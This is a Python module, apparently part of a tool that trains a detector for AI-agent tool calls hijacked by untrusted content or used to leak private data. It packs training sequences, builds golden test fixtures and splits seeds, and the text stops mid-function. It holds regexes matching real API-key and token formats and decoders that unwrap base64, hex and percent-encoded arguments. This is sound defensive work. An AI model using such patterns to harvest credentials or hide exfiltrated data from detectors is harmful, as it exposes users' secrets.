"""Normative DiodeModelBundle v1 dataset packer, golden vector suite, and zero-leakage split auditor."""

from __future__ import annotations

import argparse
import base64
import binascii
from collections.abc import Iterable, Mapping, Sequence
from dataclasses import dataclass
import json
from pathlib import Path
import random
import re
import secrets
import tempfile
from typing import Any
import urllib.parse

import numpy as np
import pyarrow as pa
import pyarrow.parquet as pq
from tokenizers import AddedToken, Tokenizer, models, normalizers, pre_tokenizers
from transformers import PreTrainedTokenizerFast

from diodemodel.contract import (
    CANONICAL_SEGMENT_IDS,
    DEFAULT_LENGTH_BUCKETS,
    REQUIRED_SPECIAL_TOKENS,
    ROLE_PAD,
    ROLE_QUERY,
    ROLE_STATE,
    BundleManifest,
)
from diodemodel.mutators import (
    ALL_THREAT_CATEGORIES,
    MAX_FLAT_ARGS,
    MAX_PCHUNKS,
    NONE_PCHUNK_IDX,
    JevTrainingPair,
    SpanItem,
    ThreatCategory,
    _StratifiedBernoulliGate,
    _map_benign_dev_category,
    apply_missing_intent_mask,
    flatten_call_arguments,
    generate_programmatic_pairs,
)
from diodemodel.parse_seeds import (
    SeedRecord,
    is_holdout_benchmark_source,
    load_permissive_seeds,
)
from diodemodel.synth_vllm import (
    CompletionBatchFn,
    get_or_create_vllm_completion_fn,
    iter_matched_vllm_pairs,
    scrub_pair_real_secrets,
)
from diodemodel.tokenizer_builder import build_jev_tokenizer, sanitize_untrusted_delimiters

DEFAULT_INFERENCE_BUCKET: int = 512
NONE_ARG_IDX: int = MAX_FLAT_ARGS

_PACKAGE_MODEL_LAB_ROOT = Path(__file__).resolve().parents[2]
GOLDEN_FIXTURES_DIR: Path = _PACKAGE_MODEL_LAB_ROOT / "tests" / "fixtures"
GOLDEN_TOKENIZER_PATH: Path = GOLDEN_FIXTURES_DIR / "golden_tokenizer.json"
GOLDEN_VECTORS_PATH: Path = GOLDEN_FIXTURES_DIR / "packer_golden.jsonl"

_QUERY_TOKEN_ORDER: tuple[str, ...] = (
    "<|q_enc|>",
    "<|q_sem|>",
    "<|q_hijack|>",
    "<|q_src|>",
    "<|q_arg|>",
)

_WORD_TOKEN_RE = re.compile(r"[A-Za-z0-9_]{3,}")
_B64_CANDIDATE_RE = re.compile(r"[A-Za-z0-9+/_-]{12,}={0,2}")
_B32_CANDIDATE_RE = re.compile(r"[A-Za-z2-7]{12,}={0,6}")
_HEX_CANDIDATE_RE = re.compile(r"[0-9a-fA-F]{16,}")
_PCT_ALNUM_RE = re.compile(r"%[3-7][0-9a-fA-F]")

_SYNTH_SECRET_AUDIT_RE = re.compile(
    r"\b(?:sk_synth|sk_test_synth|sk_openai_synth|hf_synth_tok|whsec_synth|jwt_synth_tok|"
    r"holdout_synth|gh_synth_tok|github_pat_synth|SYNTH_AWS_KEY|SYNTH_GCP_APIKEY|"
    r"aws_synth_secret|k8s_synth_bearer|npm_synth_tok|IBAN_SYNTH|OPENSSH_SYNTH_TEST_KEY|"
    r"gcp_synth_keyid|internal_wiki_synth_tok|xox_synth_tok|agentdojo_synth_code|mcpsec_synth_tok)"
    r"_[A-Za-z0-9_]{6,}\b"
)
_REAL_SECRET_AUDIT_RE = re.compile(
    r"(?:\bsk_live_[A-Za-z0-9_]{4,}\b"
    r"|\bsk-(?:proj-|svcacct-|live-)?[A-Za-z0-9_-]{20,}\b"
    r"|\bhf_[A-Za-z0-9]{24,}\b"
    r"|\bwhsec_[A-Za-z0-9_]{12,}\b"
    r"|\beyJ[A-Za-z0-9_-]{8,}\.eyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\b"
    r"|\bgh[pousr]_[A-Za-z0-9_]{10,}\b"
    r"|\bgithub_pat_[A-Za-z0-9_]{10,}\b"
    r"|\bAKIA[0-9A-Z]{12,}\b"
    r"|\bAIza[0-9A-Za-z\-_]{20,}\b"
    r"|\bxox[baprs]-[0-9A-Za-z\-]{10,}\b)"
)


class DatasetLeakageError(ValueError):
    """Raised when group/seed/benchmark/secret leakage or real-secret contamination is detected."""


def format_span_content(span: SpanItem) -> str:
    """Format a span's source label and text identically to Track B `diodemcp.packer.format_span_content`."""
    label = span.source_label.strip()
    if label and span.text:
        return f"{label}\n{span.text}"
    return span.text or label


def encode_content_safe_with_ids(
    tokenizer: Any,
    text: str,
    structural_ids: frozenset[int],
) -> list[int]:
    """Encode raw text with C2 delimiter neutralization and explicit structural ID guard."""
    if not text:
        return []
    sanitized = sanitize_untrusted_delimiters(text)
    encoded = tokenizer.encode(sanitized, add_special_tokens=False)
    raw_ids = encoded.ids if hasattr(encoded, "ids") else encoded
    ids = [int(x) for x in raw_ids]
    if not structural_ids.isdisjoint(ids):
        raise RuntimeError("Structural special token leaked into content span")
    return ids


def build_reference_4d_attn_mask(token_roles: np.ndarray) -> np.ndarray:
    """Build additive `float32[B,1,L,L]` mask from `token_roles` (`0=PAD, 1=STATE, 2=QUERY`)."""
    roles = np.asarray(token_roles, dtype=np.int64)
    if roles.ndim == 1:
        roles = roles[None, :]
    if roles.ndim != 2:
        raise ValueError(f"token_roles must have rank 2 [B, L], got shape {roles.shape}")
    if np.any((roles < ROLE_PAD) | (roles > ROLE_QUERY)):
        raise ValueError("token_roles contains invalid role values outside {0, 1, 2}")

    seq_len = roles.shape[1]
    is_state_i = (roles == ROLE_STATE)[:, :, None]
    is_query_i = (roles == ROLE_QUERY)[:, :, None]
    is_state_j = (roles == ROLE_STATE)[:, None, :]
    diag = np.eye(seq_len, dtype=bool)[None, :, :]

    allowed = ((is_state_i | is_query_i) & is_state_j) | diag
    return np.where(allowed[:, None, :, :], np.float32(0.0), np.float32(-10000.0))


def _middle_elide_ids(ids: list[int], limit: int) -> tuple[list[int], bool]:
    """Keep head + tail tokens when slicing so trailing secrets/payloads remain visible (`C7`)."""
    if len(ids) <= limit:
        return ids, False
    if limit <= 0:
        return [], True
    if limit == 1:
        return [ids[0]], True
    head = (limit + 1) // 2
    tail = limit - head
    return ids[:head] + ids[-tail:], True


def _is_printable_utf8(data: bytes) -> str | None:
    if not data:
        return None
    try:
        decoded = data.decode("utf-8", errors="strict")
    except UnicodeDecodeError:
        return None
    if len(decoded) < 6:
        return None
    printable_count = sum(ch.isprintable() or ch in "\r\n\t" for ch in decoded)
    if printable_count / len(decoded) < 0.85:
        return None
    return decoded


def _expand_arg_views_detailed(raw_strings: list[str]) -> list[tuple[str, bool, bool]]:
    """Expand raw/percent/base64/base32/hex/reversed argument views identically to Track B."""
    views: list[tuple[str, bool, bool]] = []
    seen: set[tuple[str, bool, bool]] = set()

    def _add(text: str, obfuscated: bool, is_rev: bool) -> None:
        if not text:
            return
        key = (text, obfuscated, is_rev)
        if key not in seen:
            seen.add(key)
            views.append(key)

    base_inputs: list[tuple[str, bool]] = []
    for raw in raw_strings:
        _add(raw, False, False)
        _add(raw[::-1], True, True)
        base_inputs.append((raw, False))

        for unq in (urllib.parse.unquote_plus(raw), urllib.parse.unquote(raw)):
            if unq != raw:
                pct_obf = bool(_PCT_ALNUM_RE.search(raw))
                _add(unq, pct_obf, False)
                _add(unq[::-1], True, True)
                base_inputs.append((unq, True))

    for candidate_src, _ in base_inputs:
        for match in _B64_CANDIDATE_RE.finditer(candidate_src):
            tok = match.group(0)
            padded = tok + ("=" * ((4 - len(tok) % 4) % 4))
            for decoder in (base64.b64decode, base64.urlsafe_b64decode):
                try:
                    raw_bytes = decoder(padded)
                except (binascii.Error, ValueError):
                    continue
                decoded = _is_printable_utf8(raw_bytes)
                if decoded is not None:
                    _add(decoded, True, False)
                    _add(decoded[::-1], True, True)

        for match in _B32_CANDIDATE_RE.finditer(candidate_src):
            tok = match.group(0).rstrip("=")
            padded = tok.upper() + ("=" * ((8 - len(tok) % 8) % 8))
            try:
                raw_bytes = base64.b32decode(padded, casefold=True)
            except (binascii.Error, ValueError):
                continue
            decoded = _is_printable_utf8(raw_bytes)
            if decoded is not None:
                _add(decoded, True, False)
                _add(decoded[::-1], True, True)

        for match in _HEX_CANDIDATE_RE.finditer(candidate_src):
            run = match.group(0)
            hex_slices = [run] if len(run) % 2 == 0 else [run[1:], run[:-1]]
            for hx in hex_slices:
                if len(hx) < 16:
                    continue
                try:
                    raw_bytes = bytes.fromhex(hx)
                except ValueError:
                    continue
                decoded = _is_printable_utf8(raw_bytes)
                if decoded is not None:
                    _add(decoded, True, False)
                    _add(decoded[::-1], True, True)

    return views


def _extract_ngrams_and_words(texts: list[str], max_chars: int = 8192) -> tuple[set[str], set[str]]:
    ngrams: set[str] = set()
    words: set[str] = set()
    joined = "\n".join(texts)[:max_chars].lower()
    compact = " ".join(joined.split())
    if len(compact) >= 4:
        step = 1 if len(compact) <= 2048 else 2
        for i in range(0, len(compact) - 3, step):
            ngrams.add(compact[i : i + 4])
    for match in _WORD_TOKEN_RE.finditer(joined):
        words.add(match.group(0))
    return ngrams, words


def _score_span_overlap(
    span: SpanItem,
    call_ngrams: set[str],
    call_words: set[str],
) -> float:
    if not call_ngrams and not call_words:
        return 0.0
    sample = f"{span.source_label}\n{span.text[:8192]}".lower()
    span_ngrams, span_words = _extract_ngrams_and_words([sample], max_chars=8192)
    word_hits = len(span_words & call_words)
    ngram_hits = len(span_ngrams & call_ngrams)
    denom = max(1, min(len(call_ngrams), 256))
    return (word_hits * 4.0) + (ngram_hits / denom) * 10.0 + (ngram_hits * 0.05)


@dataclass(frozen=True)
class PackedJevRow:
    """Bit-exact normative packed sequence + supervision targets for DiodeModelBundle v1."""

    input_ids: list[int]
    seg_ids: list[int]
    token_roles: list[int]
    query_positions: list[int]
    pchunk_positions: list[int]
    pchunk_valid_mask: list[bool]
    arg_positions: list[int]
    arg_valid_mask: list[bool]
    bucket_length: int
    unpadded_length: int
    none_position: int
    was_truncated: bool
    selected_span_indices: tuple[int, ...]
    selected_span_ids: tuple[str, ...]
    active_arg_keys: tuple[str, ...]
    y_enc: float
    y_sem: float
    y_hijack: float
    target_src_idx: int
    target_arg_idx: int

    def as_ort_feed(self) -> dict[str, np.ndarray]:
        """Return exact 8 `[1, ...]` numpy tensors matching `ONNX_INPUT_SPECS`."""
        return {
            "input_ids": np.asarray([self.input_ids], dtype=np.int64),
            "seg_ids": np.asarray([self.seg_ids], dtype=np.int64),
            "token_roles": np.asarray([self.token_roles], dtype=np.int64),
            "query_positions": np.asarray([self.query_positions], dtype=np.int64),
            "pchunk_positions": np.asarray([self.pchunk_positions], dtype=np.int64),
            "pchunk_valid_mask": np.asarray([self.pchunk_valid_mask], dtype=np.bool_),
            "arg_positions": np.asarray([self.arg_positions], dtype=np.int64),
            "arg_valid_mask": np.asarray([self.arg_valid_mask], dtype=np.bool_),
        }


class JevDatasetPacker:
    """Normative `DiodeModelBundle v1` sequence packer with 100% bit-exact parity with Track B."""

    def __init__(self, tokenizer: Any, manifest: BundleManifest) -> None:
        self.tokenizer = tokenizer
        self.manifest = manifest
        self._sp = dict(manifest.special_token_ids)
        self._structural_ids = frozenset(int(v) for v in self._sp.values())

    def _encode_safe(self, text: str) -> list[int]:
        return encode_content_safe_with_ids(self.tokenizer, text, self._structural_ids)

    def _select_effective_cap(self, max_bucket: int) -> int:
        buckets = sorted(self.manifest.length_buckets)
        capped = min(max_bucket, buckets[-1], self.manifest.max_seq_len)
        eligible = [b for b in buckets if b <= capped]
        return eligible[-1] if eligible else buckets[0]

    def _select_target_bucket(
        self,
        seq_len: int,
        effective_cap: int,
        *,
        pad_to_max_bucket: bool = False,
    ) -> int:
        if pad_to_max_bucket:
            return effective_cap
        for b in sorted(self.manifest.length_buckets):
            if b >= seq_len:
                return min(b, effective_cap) if seq_len <= effective_cap else b
        return effective_cap

    def _fit_ranked_spans(
        self,
        ranked_entries: list[tuple[int, SpanItem, bool, float]],
        max_slots: int,
        token_budget: int,
    ) -> tuple[list[tuple[int, SpanItem, list[int]]], bool]:
        """Select and tokenize spans within `max_slots` and `token_budget`, preserving `orig_idx` order."""
        if not ranked_entries:
            return [], False
        if token_budget < 2:
            return [], True

        truncated = len(ranked_entries) > max_slots
        candidates = ranked_entries[:max_slots]

        encoded_candidates: list[tuple[int, SpanItem, bool, list[int]]] = []
        total_needed = 0
        for orig_idx, span, is_pinned, _score in candidates:
            c_ids = self._encode_safe(format_span_content(span))
            encoded_candidates.append((orig_idx, span, is_pinned, c_ids))
            total_needed += 1 + len(c_ids)

        if total_needed <= token_budget:
            chosen = [(orig_idx, span, c_ids) for orig_idx, span, _pin, c_ids in encoded_candidates]
            chosen.sort(key=lambda item: item[0])
            return chosen, truncated

        truncated = True
        pinned_count = sum(1 for _, _, pin, _ in encoded_candidates if pin)
        pinned_per_span_cap = max(1, (token_budget // max(1, pinned_count)) - 1)
        unpinned_per_span_cap: int | None = None

        selected: list[tuple[int, SpanItem, list[int]]] = []
        remaining = token_budget

        for idx, (orig_idx, span, is_pinned, c_ids) in enumerate(encoded_candidates):
            if remaining < 2:
                break
            peers_ahead = sum(
                1 for _, _, pin_rem, _ in encoded_candidates[idx + 1 :] if pin_rem
            )
            reserve_for_pinned = peers_ahead * 2
            avail_for_this = remaining - reserve_for_pinned - 1
            if avail_for_this < 1:
                continue

            if is_pinned:
                slot_cap = pinned_per_span_cap
            else:
                if unpinned_per_span_cap is None:
                    unpinned_left = len(encoded_candidates) - idx
                    unpinned_slots = min(unpinned_left, min(8, max(1, remaining // 8)))
                    unpinned_per_span_cap = max(1, (remaining // max(1, unpinned_slots)) - 1)
                slot_cap = unpinned_per_span_cap

            cap_for_this = (
                min(avail_for_this, slot_cap)
                if idx < len(encoded_candidates) - 1 and len(c_ids) > slot_cap
                else avail_for_this
            )
            sliced_ids, _ = _middle_elide_ids(c_ids, cap_for_this)
            selected.append((orig_idx, span, sliced_ids))
            remaining -= 1 + len(sliced_ids)

        selected.sort(key=lambda item: item[0])
        return selected, truncated

    def pack_raw(
        self,
        *,
        intent: str | None,
        private_spans: Sequence[SpanItem],
        untrusted_spans: Sequence[SpanItem],
        call_server: str,
        call_tool: str,
        call_arguments: Mapping[str, Any],
        y_enc: float = 0.0,
        y_sem: float = 0.0,
        y_hijack: float = 0.0,
        attributed_pchunk_idx: int = NONE_PCHUNK_IDX,
        attributed_arg_key: str | None = None,
        max_bucket: int = DEFAULT_INFERENCE_BUCKET,
        pad_to_max_bucket: bool = False,
    ) -> PackedJevRow:
        """Pack raw state & call into normative `DiodeModelBundle v1` arrays + supervision targets."""
        sp = self._sp
        max_pchunks = self.manifest.max_pchunks
        max_args = self.manifest.max_args
        effective_cap = self._select_effective_cap(max_bucket)
        was_truncated = False

        fixed_overhead = 15
        avail = effective_cap - fixed_overhead
        if avail < 4:
            raise ValueError(f"Bucket {effective_cap} is too small for mandatory Jev skeleton")

        clean_intent = intent.strip() if intent is not None else ""
        has_intent = bool(clean_intent and clean_intent != "<|missing_intent|>")
        intent_ids: list[int] = []
        if has_intent:
            raw_intent_ids = self._encode_safe(clean_intent)
            intent_cap = min(max(1, avail - 1), max(8, avail // 5))
            intent_ids, cut_intent = _middle_elide_ids(raw_intent_ids, intent_cap)
            was_truncated = was_truncated or cut_intent
            avail -= len(intent_ids)

        raw_call_ids = self._encode_safe(f"{call_server}.{call_tool}")
        call_cap = min(avail, max(4, avail // 8))
        call_head_ids, cut_call = _middle_elide_ids(raw_call_ids, call_cap)
        was_truncated = was_truncated or cut_call
        avail -= len(call_head_ids)

        all_flat_args = flatten_call_arguments(call_arguments, max_args=None)
        flat_items = list(all_flat_args.items())
        overflow_arg_keys: set[str] = set()
        if len(flat_items) > max_args:
            was_truncated = True
            head_items = flat_items[: max_args - 1]
            tail_key = flat_items[max_args - 1][0]
            overflow_arg_keys = {k for k, _ in flat_items[max_args - 1 :]}
            merged_tail_val = "\n".join(
                f"{k}={v}" if idx > 0 else v
                for idx, (k, v) in enumerate(flat_items[max_args - 1 :])
            )
            flat_items = [*head_items, (tail_key, merged_tail_val)]

        has_spans = bool(private_spans or untrusted_spans)
        arg_budget = (
            avail
            if not has_spans
            else min(avail, max(len(flat_items) * 4, int(avail * 0.45)))
        )

        encoded_args_raw: list[tuple[str, list[int]]] = [
            (k, self._encode_safe(f"{k}={v}")) for k, v in flat_items
        ]
        packed_args: list[tuple[str, list[int]]] = []
        total_arg_tokens = sum(1 + len(a_ids) for _, a_ids in encoded_args_raw)

        if total_arg_tokens <= arg_budget:
            packed_args = encoded_args_raw
            avail -= total_arg_tokens
        else:
            was_truncated = True
            max_fit_args = min(len(encoded_args_raw), arg_budget)
            if max_fit_args > 0:
                content_pool = max(0, arg_budget - max_fit_args)
                per_arg = max(0, content_pool // max_fit_args)
                rem_extra = content_pool - (per_arg * max_fit_args)
                used_arg_tokens = 0
                for idx, (k, a_ids) in enumerate(encoded_args_raw[:max_fit_args]):
                    lim = per_arg + (1 if idx < rem_extra else 0)
                    sliced_a, _ = _middle_elide_ids(a_ids, lim)
                    packed_args.append((k, sliced_a))
                    used_arg_tokens += 1 + len(sliced_a)
                avail -= used_arg_tokens

        raw_arg_values = list(all_flat_args.values())
        expanded_arg_texts = [t for t, _obf, _rev in _expand_arg_views_detailed(raw_arg_values[:32])]
        call_ngrams, call_words = _extract_ngrams_and_words(expanded_arg_texts or raw_arg_values)

        ranked_priv: list[tuple[int, SpanItem, bool, float]] = []
        for idx, span in enumerate(private_spans):
            is_pinned = bool(span.is_high_secret)
            score = _score_span_overlap(span, call_ngrams, call_words)
            ranked_priv.append((idx, span, is_pinned, score))
        ranked_priv.sort(key=lambda item: (0 if item[2] else 1, -item[3], item[0]))

        ranked_untrust: list[tuple[int, SpanItem, bool, float]] = []
        for idx, span in enumerate(untrusted_spans):
            score = _score_span_overlap(span, call_ngrams, call_words)
            ranked_untrust.append((idx, span, False, score))
        ranked_untrust.sort(key=lambda item: (-item[3], -item[0]))

        selected_priv: list[tuple[int, SpanItem, list[int]]] = []
        selected_untrust: list[tuple[int, SpanItem, list[int]]] = []

        if ranked_priv and not ranked_untrust:
            selected_priv, cut_p = self._fit_ranked_spans(ranked_priv, max_pchunks, avail)
            was_truncated = was_truncated or cut_p
        elif ranked_untrust and not ranked_priv:
            selected_untrust, cut_u = self._fit_ranked_spans(ranked_untrust, max_pchunks, avail)
            was_truncated = was_truncated or cut_u
        elif ranked_priv and ranked_untrust:
            u_share = max(2, int(avail * 0.30)) if avail >= 6 else 0
            selected_untrust, cut_u = self._fit_ranked_spans(ranked_untrust, max_pchunks, u_share)
            u_used = sum(1 + len(u_ids) for _, _, u_ids in selected_untrust)
            p_budget = avail - u_used
            selected_priv, cut_p = self._fit_ranked_spans(ranked_priv, max_pchunks, p_budget)
            p_used = sum(1 + len(p_ids) for _, _, p_ids in selected_priv)

            if cut_u and (avail - p_used) > u_used:
                selected_untrust, cut_u = self._fit_ranked_spans(
                    ranked_untrust, max_pchunks, avail - p_used
                )
            was_truncated = was_truncated or cut_p or cut_u

        ids: list[int] = []
        segs: list[int] = []
        roles: list[int] = []

        def _emit(tok_id: int, seg: int, role: int) -> int:
            pos = len(ids)
            ids.append(tok_id)
            segs.append(seg)
            roles.append(role)
            return pos

        def _emit_many(tok_ids: list[int], seg: int, role: int) -> None:
            if not tok_ids:
                return
            ids.extend(tok_ids)
            segs.extend([seg] * len(tok_ids))
            roles.extend([role] * len(tok_ids))

        # 1-3. [CLS] (<|intent|> intent_ids | <|missing_intent|>) [SEP]
        _emit(sp["[CLS]"], 0, ROLE_STATE)
        if has_intent:
            _emit(sp["<|intent|>"], 0, ROLE_STATE)
            _emit_many(intent_ids, 0, ROLE_STATE)
        else:
            _emit(sp["<|missing_intent|>"], 0, ROLE_STATE)
        _emit(sp["[SEP]"], 0, ROLE_STATE)

        # 4-6. <|priv|> (<|pchunk|> chunk_ids)* [SEP]
        _emit(sp["<|priv|>"], 1, ROLE_STATE)
        pchunk_pos_list: list[int] = []
        selected_span_indices: list[int] = []
        selected_span_ids: list[str] = []

        for orig_idx, span, c_ids in selected_priv:
            p_seg = 2 if span.dual_trust else 1
            p_pos = _emit(sp["<|pchunk|>"], p_seg, ROLE_STATE)
            _emit_many(c_ids, p_seg, ROLE_STATE)
            pchunk_pos_list.append(p_pos)
            selected_span_indices.append(orig_idx)
            selected_span_ids.append(span.span_id)

        _emit(sp["[SEP]"], 1, ROLE_STATE)

        # 7-9. <|untrust|> (<|uchunk|> uchunk_ids)* [SEP]
        _emit(sp["<|untrust|>"], 3, ROLE_STATE)
        for _orig_idx, _span, u_ids in selected_untrust:
            _emit(sp["<|uchunk|>"], 3, ROLE_STATE)
            _emit_many(u_ids, 3, ROLE_STATE)
        _emit(sp["[SEP]"], 3, ROLE_STATE)

        # 10-12. <|call|> server.tool (<|arg|> flat_key=val_str)* [SEP]
        _emit(sp["<|call|>"], 4, ROLE_STATE)
        _emit_many(call_head_ids, 4, ROLE_STATE)
        arg_pos_list: list[int] = []
        active_arg_keys: list[str] = []
        for flat_key, a_ids in packed_args:
            a_pos = _emit(sp["<|arg|>"], 4, ROLE_STATE)
            _emit_many(a_ids, 4, ROLE_STATE)
            arg_pos_list.append(a_pos)
            active_arg_keys.append(flat_key)
        _emit(sp["[SEP]"], 4, ROLE_STATE)

        # 13. <|none|> at none_pos (seg=4, role=1)
        none_pos = _emit(sp["<|none|>"], 4, ROLE_STATE)

        # 14. 5 Query tokens (seg=5, role=2)
        q_positions: list[int] = []
        for q_tok in _QUERY_TOKEN_ORDER:
            q_positions.append(_emit(sp[q_tok], 5, ROLE_QUERY))

        unpadded_len = len(ids)
        if unpadded_len > effective_cap:
            raise RuntimeError(
                f"JevDatasetPacker overflow: unpadded_len={unpadded_len} > effective_cap={effective_cap}"
            )

        # 15. Pad right to target bucket using [PAD] (seg=0, role=0)
        bucket_len = self._select_target_bucket(
            unpadded_len, effective_cap, pad_to_max_bucket=pad_to_max_bucket
        )
        pad_count = bucket_len - unpadded_len
        if pad_count > 0:
            ids.extend([sp["[PAD]"]] * pad_count)
            segs.extend([0] * pad_count)
            roles.extend([ROLE_PAD] * pad_count)

        pchunk_positions = [none_pos] * (max_pchunks + 1)
        pchunk_valid_mask = [False] * (max_pchunks + 1)
        for i, pos in enumerate(pchunk_pos_list):
            pchunk_positions[i] = pos
            pchunk_valid_mask[i] = True
        pchunk_positions[max_pchunks] = none_pos
        pchunk_valid_mask[max_pchunks] = True

        arg_positions = [none_pos] * (max_args + 1)
        arg_valid_mask = [False] * (max_args + 1)
        for j, pos in enumerate(arg_pos_list):
            arg_positions[j] = pos
            arg_valid_mask[j] = True
        arg_positions[max_args] = none_pos
        arg_valid_mask[max_args] = True

        # Map original attribution targets onto packed active pointer indices and synchronize labels
        # if extreme truncation evicted the attributed span or argument from the visible window.
        eff_y_enc = float(y_enc)
        eff_y_sem = float(y_sem)
        eff_y_hijack = float(y_hijack)

        if max(eff_y_enc, eff_y_sem) < 0.5:
            target_src_idx = max_pchunks
        elif attributed_pchunk_idx != max_pchunks and attributed_pchunk_idx in selected_span_indices:
            target_src_idx = selected_span_indices.index(attributed_pchunk_idx)
        else:
            target_src_idx = max_pchunks
            eff_y_enc = 0.0
            eff_y_sem = 0.0

        if max(eff_y_enc, eff_y_sem, eff_y_hijack) < 0.5 or attributed_arg_key is None:
            target_arg_idx = max_args
            if max(eff_y_enc, eff_y_sem, eff_y_hijack) >= 0.5:
                eff_y_enc = 0.0
                eff_y_sem = 0.0
                eff_y_hijack = 0.0
                target_src_idx = max_pchunks
        elif attributed_arg_key in active_arg_keys:
            target_arg_idx = active_arg_keys.index(attributed_arg_key)
        elif attributed_arg_key in overflow_arg_keys and len(active_arg_keys) == max_args:
            target_arg_idx = max_args - 1
        else:
            target_arg_idx = max_args
            target_src_idx = max_pchunks
            eff_y_enc = 0.0
            eff_y_sem = 0.0
            eff_y_hijack = 0.0

        return PackedJevRow(
            input_ids=ids,
            seg_ids=segs,
            token_roles=roles,
            query_positions=q_positions,
            pchunk_positions=pchunk_positions,
            pchunk_valid_mask=pchunk_valid_mask,
            arg_positions=arg_positions,
            arg_valid_mask=arg_valid_mask,
            bucket_length=bucket_len,
            unpadded_length=unpadded_len,
            none_position=none_pos,
            was_truncated=was_truncated,
            selected_span_indices=tuple(selected_span_indices),
            selected_span_ids=tuple(selected_span_ids),
            active_arg_keys=tuple(active_arg_keys),
            y_enc=eff_y_enc,
            y_sem=eff_y_sem,
            y_hijack=eff_y_hijack,
            target_src_idx=target_src_idx,
            target_arg_idx=target_arg_idx,
        )

    def pack_pair(
        self,
        pair: JevTrainingPair,
        *,
        max_bucket: int = 4096,
        pad_to_max_bucket: bool = False,
    ) -> PackedJevRow:
        """Pack a validated `JevTrainingPair` across length curriculum buckets."""
        return self.pack_raw(
            intent=None if pair.intent_masked else pair.intent,
            private_spans=pair.private_spans,
            untrusted_spans=pair.untrusted_spans,
            call_server=pair.call_server,
            call_tool=pair.call_tool,
            call_arguments=pair.call_arguments,
            y_enc=pair.y_enc,
            y_sem=pair.y_sem,
            y_hijack=pair.y_hijack,
            attributed_pchunk_idx=pair.attributed_pchunk_idx,
            attributed_arg_key=pair.attributed_arg_key,
            max_bucket=max_bucket,
            pad_to_max_bucket=pad_to_max_bucket,
        )


def build_deterministic_golden_tokenizer() -> Tokenizer:
    """Construct a completely deterministic fast Rust WordLevel+Whitespace tokenizer for cross-track golden vectors."""
    special_ids = {tok: idx for idx, tok in enumerate(REQUIRED_SPECIAL_TOKENS)}
    base_words = [
        "[UNK]",
        "open",
        "issue",
        "login",
        "timeout",
        "stripe",
        "key",
        "secret",
        "billing",
        "calc",
        "price",
        "tier",
        "enterprise",
        "discount",
        "custom",
        "overlap",
        "alpha",
        "beta",
        "gamma",
        "delta",
        "distractor",
        "filler",
        "word",
        "github",
        "create_issue",
        "fetch",
        "fetch_url",
        "brave-search",
        "brave_web_search",
        "ide",
        "Read",
        "Write",
        "Bash",
        "postgres",
        "query",
        "slack",
        "post_message",
        "gmail",
        "send_email",
        "headers",
        "Authorization",
        "Bearer",
        "X-Trace",
        "url",
        "body",
        "items",
        "val",
        "count",
        "sql",
        "command",
        "file_path",
        "content",
        "channel",
        "text",
        "repo",
        "title",
        "env",
        "prod",
        "src",
        "mod",
        "def",
        "return",
        "DROP",
        "TABLE",
        "SELECT",
        "COUNT",
        "ProjectHelios",
        "LOI",
        "signed",
        "cash",
        "forge",
        "Summarize",
        "quarterly",
        "planning",
        "thread",
        "locally",
        "Check",
        "config",
        "pinned",
        "arg",
        "=",
        ".",
        "/",
        ":",
        "\\",
        "<",
        "|",
        ">",
        "[",
        "]",
        "{",
        "}",
        "0",
        "1",
        "2",
        "true",
        "false",
        "null",
    ]
    vocab = dict(special_ids)
    next_id = len(vocab)
    for w in base_words:
        if w not in vocab:
            vocab[w] = next_id
            next_id += 1

    tok = Tokenizer(models.WordLevel(vocab=vocab, unk_token="[UNK]"))
    tok.pre_tokenizer = pre_tokenizers.Whitespace()
    tok.add_special_tokens(
        [
            AddedToken(
                s,
                single_word=False,
                lstrip=False,
                rstrip=False,
                normalized=False,
                special=True,
            )
            for s in REQUIRED_SPECIAL_TOKENS
        ]
    )
    return tok


def load_golden_test_tokenizer_and_manifest(
    tokenizer_path: Path = GOLDEN_TOKENIZER_PATH,
) -> tuple[Tokenizer, BundleManifest]:
    """Load committed `golden_tokenizer.json` and return `(Tokenizer, BundleManifest)`."""
    tokenizer_path = Path(tokenizer_path)
    if tokenizer_path.is_file():
        tok = Tokenizer.from_file(str(tokenizer_path))
    else:
        tok = build_deterministic_golden_tokenizer()

    special_ids: dict[str, int] = {}
    for tok_str in REQUIRED_SPECIAL_TOKENS:
        tid = tok.token_to_id(tok_str)
        if tid is None:
            raise RuntimeError(f"Golden tokenizer missing special token {tok_str!r}")
        special_ids[tok_str] = int(tid)

    dummy_sha = "a" * 64
    manifest = BundleManifest(
        bundle_version="1.0",
        model_id="diodemcp-jev-base-int8",
        sha256_model_onnx=dummy_sha,
        sha256_tokenizer_json=dummy_sha,
        sha256_calibration_json=dummy_sha,
        max_seq_len=8192,
        length_buckets=list(DEFAULT_LENGTH_BUCKETS),
        max_pchunks=MAX_PCHUNKS,
        max_args=MAX_FLAT_ARGS,
        special_token_ids=special_ids,
        segment_ids=dict(CANONICAL_SEGMENT_IDS),
        thresholds={"warn_min": 0.20, "critical_min": 0.80},
        ece_val=0.015,
    )
    return tok, manifest


def compute_group_key(repo_or_source: str, seed_id: str) -> str:
    """Compute canonical repository/template family key for strict group-disjoint splitting."""
    cleaned = repo_or_source.strip().lower()
    if cleaned:
        return cleaned
    parts = seed_id.strip().lower().split("_")
    return "_".join(parts[:3]) if len(parts) >= 3 else seed_id.strip().lower()


@dataclass(frozen=True)
class StratifiedSeedPartition:
    """Category-stratified, strictly group-disjoint seed partition across train/val/eval splits."""

    train_seeds: list[SeedRecord]
    val_seeds: list[SeedRecord]
    eval_dev_seeds: list[SeedRecord]
    holdout_bench_seeds: list[SeedRecord]
    train_groups: tuple[str, ...]
    val_groups: tuple[str, ...]
    eval_dev_groups: tuple[str, ...]


def partition_seeds_stratified_by_group(
    seeds: Sequence[SeedRecord | dict[str, Any]],
    *,
    rng_seed: int = 42,
) -> StratifiedSeedPartition:
    """Partition seeds into disjoint `compute_group_key` groups stratified by `ThreatCategory` (`T1–T7`)."""
    holdout_bench_seeds: list[SeedRecord] = []
    train_pool_seeds: list[SeedRecord] = []

    for item in seeds:
        rec = item if isinstance(item, SeedRecord) else SeedRecord.model_validate(item)
        probe = f"{rec.seed_id} {rec.repo_or_source}"
        if rec.split == "eval_holdout" or is_holdout_benchmark_source(probe):
            holdout_bench_seeds.append(rec)
        else:
            train_pool_seeds.append(rec)

    by_group: dict[str, list[SeedRecord]] = {}
    group_cat_counts: dict[str, dict[ThreatCategory, int]] = {}
    for rec in train_pool_seeds:
        g = compute_group_key(rec.repo_or_source, rec.seed_id)
